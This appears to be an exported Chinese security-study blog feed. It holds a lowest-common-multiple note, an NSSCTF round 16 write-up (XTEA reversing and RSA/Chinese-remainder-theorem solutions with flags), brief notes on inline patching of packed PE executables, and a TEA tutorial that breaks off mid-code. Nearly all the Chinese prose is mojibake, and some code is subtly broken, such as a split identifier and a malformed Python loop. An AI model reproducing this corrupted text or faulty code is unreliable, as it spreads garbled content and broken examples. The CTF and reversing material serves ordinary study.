0$,mæ˜¯aï¼Œbä¸­æ‰€æœ‰æ­£çš„å…¬å€æ•°ä¸­æœ€å°çš„ï¼Œmå«ä½œaå’Œbçš„æœ€å°å…¬å€æ•°</li><li>è‹¥aæˆ–bæœ‰ä¸€ä¸ªç­‰äº0,lam(a,b)=0</li></ul><p>è®¾$m=lcm(a,b)$,å¦‚æœ$a|c,b|c$,åˆ™$m|c$</p><p>$gcd(a,b)=1\rightarrow lcm(a,b)=ab$</p><p>è®¡ç®—lcmï¼š</p><ul><li>$lcm(a,b)=\frac{ab}{gcd(a,b)}$</li><li>ä¸¤ä¸ªæ•°è¿­ä»£åŠ è‡ªå·±ç›´åˆ°ç›¸ç­‰</li></ul>]]></content>
      
      
      <categories>
          
          <category> å¯†ç å­¦ </category>
          
          <category> åŸºç¡€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å¯†ç å­¦ </tag>
            
            <tag> æ•°å­¦ </tag>
            
            <tag> çŸ¥è¯† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_r16é¢˜ç›®å¤ç°</title>
      <link href="/posts/6e766646.html"/>
      <url>/posts/6e766646.html</url>
      
        <content type="html"><![CDATA[<p>ï¼ˆå¥½éš¾ï¼Œè¢«è–„çº±äº†QAQï¼‰</p><h2 id="RE">RE</h2><h3 id="test-your-Debugger">test your Debugger</h3><p>ç›´æ¥åŠ¨æ€è°ƒè¯•åœ¨æç¤ºçš„ä½ç½®æ‰“æ–­ç‚¹</p><p>å¾—ç»“æœ</p><p>ç•¥</p><h3 id="CompileMe">CompileMe!!!</h3><p>æ–‡ä»¶æ‰“å¼€ä»¥åæ˜¯slnæºä»£ç æ–‡ä»¶ï¼Ÿï¼Ÿç”šè‡³ä¸ç”¨é€†å‘ï¼Ÿ<br>æ‰“å¼€ä¹‹åï¼šå®Œå‹å¡«ç©ºï¼Ÿ</p><p>çœ‹èµ·æ¥æ˜¯ä¸€ä¸ªç®€å•çš„XTEAï¼Œä½†æ˜¯vsä¸€å¼€å°±å´©æºƒï¼Œvscodeä¹Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆä¸èƒ½è¿è¡Œã€‚ã€‚ã€‚é‚£å…ˆçœ‹çœ‹é¢˜ï¼ˆè¡¥å…¨åï¼‰ï¼š</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">NSSCTF</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">internal</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> key = <span class="keyword">new</span> <span class="built_in">ulong</span>[] &#123; <span class="number">0x57656c636f6d6520</span>, <span class="number">0x746f204e53534354</span>, <span class="number">0x4620526f756e6423</span>, <span class="number">0x3136204261736963</span> &#125;;</span><br><span class="line">            <span class="keyword">var</span> c = <span class="keyword">new</span> <span class="built_in">ulong</span>[] &#123; <span class="number">0xc60b34b2bff9d34a</span>, <span class="number">0xf50af3aa8fd96c6b</span>, <span class="number">0x680ed11f0c05c4f1</span>, <span class="number">0x6e83b0a4aaf7c1a3</span>, <span class="number">0xd69b3d568695c3c5</span>, <span class="number">0xa88f4ff50a351da2</span>, <span class="number">0x5cfa195968e1bb5b</span>, <span class="number">0xc4168018d92196d9</span> &#125;;</span><br><span class="line">            <span class="keyword">const</span> <span class="built_in">ulong</span> e = <span class="number">0x9E3779B9</span>;</span><br><span class="line">            <span class="keyword">var</span> delta = Enumerable.Range(<span class="number">0</span>, <span class="number">32</span>).Select(index =&gt; e * (<span class="number">32</span> - (<span class="built_in">uint</span>)index)).ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">var</span> decryptedBlocks = c.Select((block, index) =&gt; <span class="keyword">new</span> &#123; Value = block, Index = index &#125;)</span><br><span class="line">                .GroupBy(item =&gt; item.I ndex / <span class="number">2</span>)</span><br><span class="line">                .Select(<span class="keyword">group</span> =&gt;</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">ulong</span> b1 = <span class="keyword">group</span>.ElementAt(<span class="number">0</span>).Value;</span><br><span class="line">                    <span class="built_in">ulong</span> b2 = <span class="keyword">group</span>.ElementAt(<span class="number">1</span>).Value;</span><br><span class="line">                    <span class="built_in">ulong</span> sum = e * <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">                    delta.ToList().ForEach(currentDelta =&gt;</span><br><span class="line">                    &#123;</span><br><span class="line">                        b2 -= (((b1 &lt;&lt; <span class="number">4</span>) ^ (b1 &gt;&gt; <span class="number">5</span>)) + b1) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">                        sum -= e;</span><br><span class="line">                        b1 -= (((b2 &lt;&lt; <span class="number">4</span>) ^ (b2 &gt;&gt; <span class="number">5</span>)) + b2) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line">                    &#125;);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span>[] &#123; b1, b2 &#125;;</span><br><span class="line">                &#125;)</span><br><span class="line">                .SelectMany(block =&gt; block)</span><br><span class="line">                .ToArray();</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ulong</span>[] decryptedText = <span class="keyword">new</span> <span class="built_in">ulong</span>[decryptedBlocks.Length];</span><br><span class="line">            Array.Copy(decryptedBlocks, decryptedText, decryptedText.Length);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            decryptedText.SelectMany(block =&gt; BitConverter.GetBytes(<span class="keyword">new</span> ZZZ(block).GetVal()).Reverse()).ToList().ForEach(byteValue =&gt; Console.Write(Encoding.ASCII.GetString(<span class="keyword">new</span>[] &#123; byteValue &#125;)));</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é€»è¾‘å¯ä»¥çœ‹æ‡‚ï¼Œå¯ä»¥å°è¯•ç”¨Cé‡å†™ä¸€éä»£ç </p><p>ä½†æ˜¯åé¢æœ‰ä¸€ä¸ªè°ƒç”¨zzz</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title">ZZZ</span>(<span class="title">ulong</span> <span class="title">val</span>) : <span class="title">ZZY</span>(<span class="title">val</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="built_in">ulong</span> <span class="title">GetVal</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">base</span>.GetVal();</span><br><span class="line">        <span class="keyword">return</span> val + <span class="number">0x413FD584E295889</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€ŒZZZåˆ°Açš„ä¸€ä¸‡å…­åƒè¡Œä»£ç éƒ½æ˜¯ç±»ä¼¼è¿™ä¸ªçš„å‡½æ•°</p><p>ï¼ˆäº‹åæ‰å‘ç°è¿™é‡Œè°ƒç”¨çš„ä»£ç æ˜¯base.GetVal()åªæ˜¯è°ƒç”¨äº†ç»§æ‰¿è‡ªZZYçš„getvalå‡½æ•°ç„¶è€Œæ²¡æœ‰è¿”å›å€¼åˆ°ç¡®å®šçš„å˜é‡ï¼‰</p><p>é‚£ä¹ˆå°±éœ€è¦ç”¨ä¸€ä¸ªå‡½æ•°æ¥è¯»å–å¹¶è¾“å‡ºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">lines = <span class="built_in">open</span>(<span class="string">&#x27;Program.cs&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).readlines()</span><br><span class="line"> </span><br><span class="line">a = <span class="string">b&#x27;unsigned __int64 (unsigned __int64 val) &#123;\n&#x27;</span></span><br><span class="line">c = <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">    <span class="keyword">if</span> line.startswith(<span class="string">b&#x27;            return val&#x27;</span>):</span><br><span class="line">        a += <span class="string">b&#x27;    val = &#x27;</span>+line[<span class="number">18</span>:]</span><br><span class="line">a += c</span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;c.py&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(a)</span><br></pre></td></tr></table></figure><p>ç„¶åå¤åˆ¶è¿™ä¸ªå‡½æ•°åˆ°è§£å¯†é‡Œé¢å¹¶è°ƒç”¨ã€‚</p><p>æœ€åçš„ä»£ç æ˜¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">dec</span><span class="params">(<span class="type">unsigned</span> __int64 *a)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> __int64 b2; </span><br><span class="line">    <span class="type">unsigned</span> __int64 b1; </span><br><span class="line">    b1 = *a;</span><br><span class="line">    b2 = a[<span class="number">1</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> e = <span class="number">0x9E3779B9</span>;</span><br><span class="line">    <span class="type">unsigned</span> __int64 key[<span class="number">4</span>] = &#123; <span class="number">0x57656c636f6d6520</span>, <span class="number">0x746f204e53534354</span>, <span class="number">0x4620526f756e6423</span>, <span class="number">0x3136204261736963</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> __int64 sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        sum += e;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; ++i) &#123;</span><br><span class="line"></span><br><span class="line">        b2 -= (((b1 &lt;&lt; <span class="number">4</span>) ^ (b1 &gt;&gt; <span class="number">5</span>)) + b1) ^ (sum + key[(sum &gt;&gt; <span class="number">11</span>) &amp; <span class="number">3</span>]);</span><br><span class="line">        sum -= e;</span><br><span class="line">        b1 -= (((b2 &lt;&lt; <span class="number">4</span>) ^ (b2 &gt;&gt; <span class="number">5</span>)) + b2) ^ (sum + key[sum &amp; <span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    *a = b1;</span><br><span class="line">    a[<span class="number">1</span>] = b2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">ccc</span><span class="params">(<span class="type">unsigned</span> __int64 val)</span> &#123;</span><br><span class="line">    ......</span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line"> &#125;<span class="comment">//å†™å®Œå°±5ä¸‡å­—äº†</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">unsigned</span> __int64 Q[<span class="number">8</span>] = &#123;</span><br><span class="line">    <span class="number">0xc60b34b2bff9d34a</span>, <span class="number">0xf50af3aa8fd96c6b</span>, <span class="number">0x680ed11f0c05c4f1</span>, <span class="number">0x6e83b0a4aaf7c1a3</span>, </span><br><span class="line">    <span class="number">0xd69b3d568695c3c5</span>, <span class="number">0xa88f4ff50a351da2</span>, <span class="number">0x5cfa195968e1bb5b</span>, <span class="number">0xc4168018d92196d9</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">0</span>; k &lt; <span class="number">4</span>; k++)</span><br><span class="line">    &#123;</span><br><span class="line">        dec(&amp;Q[k*<span class="number">2</span>]);</span><br><span class="line">        <span class="comment">//sdecrypt(&amp;Q[k * 2], &amp;Q[k * 2 + 1]);</span></span><br><span class="line"></span><br><span class="line">        Q[k * <span class="number">2</span>] = ccc(Q[k * <span class="number">2</span>]);</span><br><span class="line">        Q[k * <span class="number">2</span> +<span class="number">1</span>] = ccc(Q[k * <span class="number">2</span>+<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%#llx,\n&quot;</span>, Q[i]);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">8</span>; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;Q[i]);</span><br><span class="line">    getchar();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x4e53534354467b35</span>,</span><br><span class="line"><span class="number">0x384d745534695478</span>,</span><br><span class="line"><span class="number">0x34754b7538505648</span>,</span><br><span class="line"><span class="number">0x4559795939613774</span>,</span><br><span class="line"><span class="number">0x5a30646171564966</span>,</span><br><span class="line"><span class="number">0x4a5656396b704d52</span>,</span><br><span class="line"><span class="number">0x5a37757644475948</span>,</span><br><span class="line"><span class="number">0x52754a35384d7a7d</span></span><br></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">NSSCTF</span>&#123;<span class="number">58</span>MtU4iTx4uKu8PVHEYyY9a7tZ0daqVIfJVV9kpMRZ7uvDGYHRuJ58Mz&#125;</span><br></pre></td></tr></table></figure><h2 id="CRYPTO">CRYPTO</h2><h3 id="pr">pr</h3><p>æ‰“å¼€é¢˜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">flag=plaintext = <span class="string">&#x27;NSSCTF&#123;****************&#125;&#x27;</span></span><br><span class="line">charset = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span></span><br><span class="line">padding_length = <span class="number">100</span> - <span class="built_in">len</span>(plaintext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(padding_length):</span><br><span class="line">    plaintext += random.choice(charset)</span><br><span class="line"></span><br><span class="line">e = <span class="number">31413537523</span></span><br><span class="line">message = bytes_to_long(plaintext.encode())</span><br><span class="line"><span class="keyword">assert</span> message &gt; (<span class="number">1</span> &lt;&lt; <span class="number">512</span>)</span><br><span class="line"><span class="keyword">assert</span> message &lt; (<span class="number">1</span> &lt;&lt; <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">prime_p = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_q = getPrime(<span class="number">512</span>)</span><br><span class="line">prime_r = getPrime(<span class="number">512</span>)</span><br><span class="line">n1 = prime_p * prime_q</span><br><span class="line">n2 = prime_q * prime_r</span><br><span class="line">ciphertext1 = <span class="built_in">pow</span>(message, e, n1)</span><br><span class="line">ciphertext2 = <span class="built_in">pow</span>(message, e, n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1=&#x27;</span>, ciphertext1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2=&#x27;</span>, ciphertext2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p=&#x27;</span>, prime_p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;r=&#x27;</span>, prime_r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1= 36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line"><span class="string">c2= 15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line"><span class="string">p= 12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line"><span class="string">r= 10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">è¿‡ç¨‹:</span></span><br><span class="line">å–è´¨æ•°p,q,r</span><br><span class="line">e = ...</span><br><span class="line">n1 = pq</span><br><span class="line">n2 = qr</span><br><span class="line">c1 = m^e mod n1</span><br><span class="line">c2 = m^e mod n2</span><br><span class="line">å·²çŸ¥c1,c2,e,p,ræ±‚m</span><br></pre></td></tr></table></figure><p>æ ¹æ®<br>$$<br>\begin{cases}<br>c_1\equiv m^e(\mod n_1)\\<br>c_2\equiv m^e(\mod n_2)<br>\end{cases}<br>$$<br>å’ŒåŒä½™å®šç†<br>$$<br>è‹¥a-bæ˜¯nçš„å€æ•°,é‚£ä¹ˆaå’Œbåœ¨\mod nä¸‹åŒä½™<br>$$<br>å› ä¸ºåŸå¼å¯å¾—<br>$$<br>\begin{cases}<br>c_1-m^e=kpq\\<br>c_2-m^e=kqr<br>\end{cases}<br>$$<br>æ‰€ä»¥<br>$$<br>\begin{cases}<br>c_1\equiv m^e(\mod p)\\<br>c_2\equiv m^e(\mod r)<br>\end{cases}<br>$$<br>æ‰€ä»¥<br>$$<br>\begin{cases}<br>m^e\equiv c_1(\mod p)\\<br>m^e\equiv c_2(\mod r)<br>\end{cases}<br>$$<br>æ ¹æ®ä¸­å›½å‰©ä½™å®šç†å¯ä»¥ç›´æ¥æ±‚m</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥çš„å‚æ•°</span></span><br><span class="line">c1 = <span class="number">36918910341116680090654563538246204134840776220077189276689868322808977412566781872132517635399441578464309667998925236488280867210758507758915311644529399878185776345227817559234605958783077866016808605942558810445187434690812992072238407431218047312484354859724174751718700409405142819140636116559320641695</span></span><br><span class="line">c2 = <span class="number">15601788304485903964195122196382181273808496834343051747331984997977255326224514191280515875796224074672957848566506948553165091090701291545031857563686815297483181025074113978465751897596411324331847008870832527695258040104858667684793196948970048750296571273364559767074262996595282324974180754813257013752</span></span><br><span class="line">p = <span class="number">12101696894052331138951718202838643670037274599483776996203693662637821825873973767235442427190607145999472731101517998719984942030184683388441121181962123</span></span><br><span class="line">r = <span class="number">10199001137987151966640837133782537428248507382360655526592866939552984259171772190788036403425837649697437126360866173688083643144865107648483668545682383</span></span><br><span class="line">e = <span class="number">31413537523</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ±‚n</span></span><br><span class="line">n = p*r</span><br><span class="line"></span><br><span class="line"><span class="comment">#æ±‚æ¨¡é€†å…ƒ</span></span><br><span class="line">j1 = invert(r,p)</span><br><span class="line">j2 = invert(p,r)</span><br><span class="line"><span class="comment">#æ±‚a</span></span><br><span class="line">a = c1*j1*r+c2*j2*p</span><br><span class="line"><span class="comment">#å¼€æ–¹</span></span><br><span class="line">d = invert(e, (p-<span class="number">1</span>)*(r-<span class="number">1</span>))</span><br><span class="line">last = <span class="built_in">pow</span>(a,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(last))</span><br><span class="line"><span class="comment">#b&#x27;NSSCTF&#123;yUanshEnx1ncHun2o23!&#125;FA3JmflIoai8BxgdIGUQumsNc5R0hpo53zICaiWZRfjBj59P36EwC4CSfJOsZ3LIOYnhUmsQ&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€Šé€†æ ¸ã€‹06-å†…åµŒè¡¥ä¸</title>
      <link href="/posts/9b8c0cc4.html"/>
      <url>/posts/9b8c0cc4.html</url>
      
        <content type="html"><![CDATA[<h2 id="å†…åµŒä»£ç è¡¥ä¸">å†…åµŒä»£ç è¡¥ä¸</h2><p>åŒºåˆ«äºç›´æ¥ä¿®æ”¹ç¨‹åºä»£ç ï¼Œå†…åµŒè¡¥ä¸æ˜¯ä¸“é—¨ä½œç”¨äºæœ‰åŠ å¯†ï¼Œæ ¡éªŒï¼Œå‹ç¼©çš„ç¨‹åºï¼Œåœ¨ç¨‹åºä¸­æ’å…¥å†…åµŒè¡¥ä¸ï¼Œå¹¶åœ¨è§£å¯†è§£å‹åæ‰§è¡Œè¡¥ä¸å†…å®¹ï¼Œæœ€åè·³è½¬åˆ°OEPï¼Œæ¯”ä¿®æ”¹åŠ å¯†/å‹ç¼©åçš„ä»£ç æ›´æ–¹ä¾¿ã€‚</p><h3 id="æ­¥éª¤">æ­¥éª¤</h3><p>è®¾ç½®è¡¥ä¸çš„ä½ç½®</p><ul><li>æ–‡ä»¶çš„ç©ºç™½åŒºåŸŸï¼ˆè¡¥ä¸ä»£ç å°‘æ—¶ï¼‰</li><li>æ‰©å±•åçš„æœ€åä¸€ä¸ªèŠ‚åŒº</li><li>æ·»åŠ çš„æ–°èŠ‚åŒº</li></ul><p>æ³¨ï¼šæ·»åŠ è¡¥ä¸çš„èŠ‚åŒºä¸€å®šè¦æœ‰å¯å†™æƒé™ï¼Œè·å¾—ç›¸åº”å†…å­˜çš„å¯å†™æƒé™</p><p>åœ¨è§£å¯†åçš„ä½ç½®ï¼ˆjmp OEPï¼‰å†™è·³è½¬è¯­å¥è·³åˆ°è¡¥ä¸ä½ç½®ï¼Œæœ€åç”±è¡¥ä¸è·³åˆ°OEP</p><hr><p>[æ–½å·¥ä¸­][QAQ]</p><hr><p>ç¬¬äºŒéƒ¨åˆ†ï¼šå®Œ</p>]]></content>
      
      
      <categories>
          
          <category> é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç† </category>
          
      </categories>
      
      
        <tags>
            
            <tag> é€†å‘ </tag>
            
            <tag> å­¦ä¹  </tag>
            
            <tag> PE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>åŠ å¯†02:TEA</title>
      <link href="/posts/d89283b5.html"/>
      <url>/posts/d89283b5.html</url>
      
        <content type="html"><![CDATA[<h1>Tiny Encryption Algorithm</h1><p>ï¼ˆå¾®å‹åŠ å¯†ç®—æ³•ï¼‰</p><h2 id="æ€§è´¨">æ€§è´¨</h2><p>å—åŠ å¯†ï¼Œå¯¹ç§°åŠ å¯†</p><ul><li>å—åŠ å¯†ï¼šå°†æ˜æ–‡æŒ‰ä¸€å®šå¤§å°åˆ†ç»„ä¹‹åç”¨ç¡®å®šçš„ç®—æ³•å’Œå¯¹ç§°å¯†é’¥å¯¹é­…æ—åˆ†åˆ«åŠ å¯†ï¼Œä¸€èˆ¬æ¥è¯´åŠ å¯†å’Œè§£å¯†å‡½æ•°ä¸ºåå‡½æ•°ï¼Œä¸€èˆ¬ä¼šè¿›è¡Œå¤šè½®åŠ å¯†</li><li>å¯¹ç§°åŠ å¯†ï¼šåŠ å¯†è§£å¯†åŒæ–¹ä½¿ç”¨åŒä¸€ä¸ªå¯†é’¥åŠ å¯†è§£å¯†æˆ–åŒæ–¹ä½¿ç”¨çš„æ˜¯ä¸¤ä¸ªå¯ä»¥ç®€å•åœ°ç›¸äº’æ¨ç®—çš„å¯†é’¥</li></ul><h2 id="è¿‡ç¨‹">è¿‡ç¨‹</h2><h3 id="å®šä¹‰ä¸åˆå§‹åŒ–">å®šä¹‰ä¸åˆå§‹åŒ–</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">key = [a,b,c,d]<span class="comment">#ä¸€èˆ¬æ˜¯4ä¸ªå€¼</span></span><br><span class="line">delta = <span class="number">0x9E3779B9</span></span><br></pre></td></tr></table></figure><h3 id="è½®åŠ å¯†">è½®åŠ å¯†</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">0</span>,<span class="built_in">len</span>(m),<span class="number">2</span>):</span><br><span class="line">x = m[i]</span><br><span class="line">y = m[i+<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">delta++</span><br><span class="line">x += ((y &lt;&lt; <span class="number">4</span>) + Key[<span class="number">0</span>]) ^ (y + delta) ^ ((y &gt;&gt; <span class="number">5</span>) + Key[<span 